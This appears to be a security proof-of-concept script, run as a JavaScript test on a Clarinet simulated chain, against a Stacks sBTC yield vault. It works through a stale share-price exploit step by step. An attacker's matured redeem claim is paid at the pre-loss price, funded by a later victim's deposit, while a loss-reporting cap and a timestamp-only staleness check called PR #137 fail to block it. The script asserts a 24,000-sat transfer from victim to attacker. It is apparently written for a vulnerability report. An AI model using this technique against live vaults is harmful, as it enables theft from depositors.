import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const simnet = await initSimnet('tests/security/stale-nav/Clarinet.toml');
const accounts = simnet.getAccounts();
const deployer = accounts.get('deployer');
const rewarder = accounts.get('wallet_1');
const attacker = accounts.get('wallet_2');
const victim = accounts.get('wallet_3');
if (!deployer || !rewarder || !attacker || !victim) throw new Error('missing accounts');

const BASE = 100_000_000n;
const ATTACKER_SHARES = 40_000_000n;
const LEGACY = 60_000_000n;
const VICTIM_DEPOSIT = 40_000_000n;
const LOSS = 60_000n; // exactly 6 bps of the 1.00 sBTC pre-loss vault
const FIVE_BPS = 50_000n;
const FINAL_ONE_BP = LOSS - FIVE_BPS;
const SBTC = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';
const c = n => `${deployer}.${n}`;
const reserve = c('reserve');
const helper = c('strategy-loss-helper');

const text = r => cvToString(r.result);
const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);
function expect(label, r, wanted) {
  const got = text(r);
  console.log(`${label}: ${got}`);
  assert.equal(got, wanted, `${label}: expected ${wanted}, got ${got}`);
}
function u(r) {
  const m = text(r).match(/(?:\(ok )?u(\d+)\)?/);
  if (!m) throw new Error(text(r));
  return BigInt(m[1]);
}
function sbtc(who) {
  return u(simnet.callReadOnlyFn(SBTC, 'get-balance-available', [Cl.principal(who)], deployer));
}
function hbtc(who) {
  return u(ro('token-hbtc', 'get-balance', [Cl.principal(who)], who));
}
function price() {
  return u(ro('state', 'get-share-price'));
}
function totalAssets() {
  return u(ro('state', 'get-total-assets'));
}
function supply() {
  return u(ro('token-hbtc', 'get-total-supply'));
}
function assetsForShares(shares, sender = deployer) {
  return u(ro('state', 'convert-to-assets', [Cl.uint(shares)], sender));
}

function requestRole(fn, address) {
  expect(fn, pub('hq-hbtc', fn, [Cl.principal(address), Cl.bool(true)], deployer), '(ok true)');
}
function confirmRole(fn, address) {
  expect(fn, pub('hq-hbtc', fn, [Cl.principal(address)], deployer), '(ok true)');
}

const state = c('state');
const vault = c('vault');
const controller = c('controller-hbtc');
for (const address of [state, vault, controller, helper]) requestRole('request-protocol-update', address);
requestRole('request-rewarder-update', rewarder);
expect('request sBTC asset', pub('state', 'request-asset-add', [
  Cl.principal(SBTC), Cl.buffer(new Uint8Array(32)), Cl.uint(8), Cl.uint(500), Cl.bool(false),
], deployer), '(ok true)');

simnet.mineEmptyBlocks(200);
for (const address of [state, vault, controller, helper]) confirmRole('confirm-protocol-request', address);
confirmRole('confirm-rewarder-request', rewarder);
expect('confirm sBTC asset', pub('state', 'confirm-asset-request', [Cl.principal(SBTC)], deployer), '(ok true)');
expect('deposit cap', pub('state', 'set-deposit-cap', [Cl.uint(2n * BASE)], deployer), '(ok true)');

// These are unchanged source defaults. The PoC does not raise either loss or
// share-price deviation limits in order to make the exploit succeed.
expect('default max-reward', ro('state', 'get-max-reward'), 'u5');
expect('default max-deviation', ro('state', 'get-max-deviation'), 'u7');
expect('default update-window', ro('state', 'get-update-window'), 'u86340');

for (const [who, amount] of [
  [attacker, ATTACKER_SHARES],
  [deployer, LEGACY],
  [victim, VICTIM_DEPOSIT],
]) {
  const r = simnet.callPrivateFn(
    SBTC,
    'protocol-mint-many-iter',
    [Cl.tuple({ amount: Cl.uint(amount), recipient: Cl.principal(who) })],
    deployer,
  );
  assert.equal(text(r), '(ok true)');
}

console.log('=== establish pre-loss vault and pre-position a matured claim ===');
expect('attacker deposit', pub('vault', 'deposit', [Cl.uint(ATTACKER_SHARES), Cl.none()], attacker), '(ok u40000000)');
expect('legacy deposit', pub('vault', 'deposit', [Cl.uint(LEGACY), Cl.none()], deployer), '(ok u60000000)');
expect('matured claim request', pub('vault', 'request-redeem', [Cl.uint(ATTACKER_SHARES), Cl.bool(false)], attacker), '(ok u1)');
simnet.mineEmptyBlocks(500);
assert.equal(totalAssets(), BASE);
assert.equal(supply(), BASE);
assert.equal(price(), BASE);

console.log('=== make NAV fresh, then realize a loss immediately afterwards ===');
expect('deploy 1 sBTC to external strategy', pub('strategy-loss-helper', 'pull-from-reserve', [Cl.uint(BASE)], deployer), '(ok true)');
expect('fresh NAV log', pub('controller-hbtc', 'log-reward', [Cl.uint(0), Cl.bool(true)], rewarder), '(ok true)');
const freshLastLogTs = u(ro('state', 'get-last-log-ts'));
expect(
  'PR137 exact timestamp guard immediately after fresh log',
  ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshLastLogTs)]),
  'false',
);

expect('realize 6bps loss', pub('strategy-loss-helper', 'realize-loss', [Cl.uint(LOSS), Cl.principal(deployer)], deployer), '(ok true)');
assert.equal(sbtc(helper), BASE - LOSS);

// This is the crucial duplicate/fix distinction: the economic NAV is now stale,
// but PR #137's exact timestamp-only predicate still says the share price is fresh.
expect(
  'PR137 exact timestamp guard after realized external loss',
  ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshLastLogTs)]),
  'false',
);

// The economic loss is already real, but unchanged production accounting cannot
// recognize the 6bps delta: it is one basis point above max-reward=5.
expect('immediate 6bps negative update exceeds cap', pub('controller-hbtc', 'log-reward', [Cl.uint(LOSS), Cl.bool(false)], rewarder), '(err u102009)');
assert.equal(price(), BASE);
expect(
  'PR137 guard remains false while corrective accounting is blocked',
  ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshLastLogTs)]),
  'false',
);

console.log('=== later depositor supplies fresh principal at stale pre-loss NAV ===');
expect('victim stale deposit', pub('vault', 'deposit', [Cl.uint(VICTIM_DEPOSIT), Cl.none()], victim), '(ok u40000000)');
assert.equal(sbtc(reserve), VICTIM_DEPOSIT);
assert.equal(hbtc(victim), VICTIM_DEPOSIT);
expect(
  'PR137 guard still allows the stale-price deposit window',
  ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshLastLogTs)]),
  'false',
);

console.log('=== matured claimant consumes that principal at the same stale NAV ===');
expect('fund old matured claim', pub('vault', 'fund-claim', [Cl.uint(1)], attacker), '(ok u40000000)');
assert.equal(sbtc(reserve), 0n);
expect('redeem old claim', pub('vault', 'redeem', [Cl.uint(1)], attacker), '(ok u40000000)');
assert.equal(totalAssets(), BASE);
assert.equal(supply(), BASE);
assert.equal(price(), BASE);

console.log('=== production guards force loss reconciliation across two daily windows ===');
simnet.mineEmptyBlocks(200);
expect('post-window full 6bps update still exceeds cap', pub('controller-hbtc', 'log-reward', [Cl.uint(LOSS), Cl.bool(false)], rewarder), '(err u102009)');
expect('recognize only first 5bps', pub('controller-hbtc', 'log-reward', [Cl.uint(FIVE_BPS), Cl.bool(false)], rewarder), '(ok true)');
assert.equal(price(), 99_950_000n);
expect('remaining 1bp blocked in same window', pub('controller-hbtc', 'log-reward', [Cl.uint(FINAL_ONE_BP), Cl.bool(false)], rewarder), '(err u102011)');

simnet.mineEmptyBlocks(200);
expect('recognize final 1bp in next window', pub('controller-hbtc', 'log-reward', [Cl.uint(FINAL_ONE_BP), Cl.bool(false)], rewarder), '(ok true)');
assert.equal(totalAssets(), BASE - LOSS);
assert.equal(supply(), BASE);
assert.equal(price(), 99_940_000n);

console.log('=== exact value-transfer invariant under unchanged live limits ===');
const victimShares = hbtc(victim);
const victimValue = assetsForShares(victimShares, victim);
const attackerFairValue = ATTACKER_SHARES * (BASE - LOSS) / BASE;
const attackerStalePayout = ATTACKER_SHARES;
const attackerExcess = attackerStalePayout - attackerFairValue;
const victimLoss = VICTIM_DEPOSIT - victimValue;

console.log(`attacker stale payout raw:       ${attackerStalePayout}`);
console.log(`attacker fair post-loss raw:     ${attackerFairValue}`);
console.log(`attacker excess exit raw:        ${attackerExcess}`);
console.log(`victim deposit raw:              ${VICTIM_DEPOSIT}`);
console.log(`victim post-reconciliation raw:  ${victimValue}`);
console.log(`victim loss raw:                 ${victimLoss}`);

assert.equal(attackerFairValue, 39_976_000n);
assert.equal(attackerExcess, 24_000n);
assert.equal(victimValue, 39_976_000n);
assert.equal(victimLoss, 24_000n);
assert.equal(attackerExcess, victimLoss);

console.log('PASS LIVE-LIMIT VALUE TRANSFER: with max-reward=5bps, max-deviation=7bps and update-window=86340s unchanged, a 6bps realized loss lets a matured claimant avoid exactly 24,000 sats of loss, and a later depositor loses exactly the same 24,000 sats after full reconciliation. PR #137 exact timestamp-only staleness logic remains false during the exploit window.');
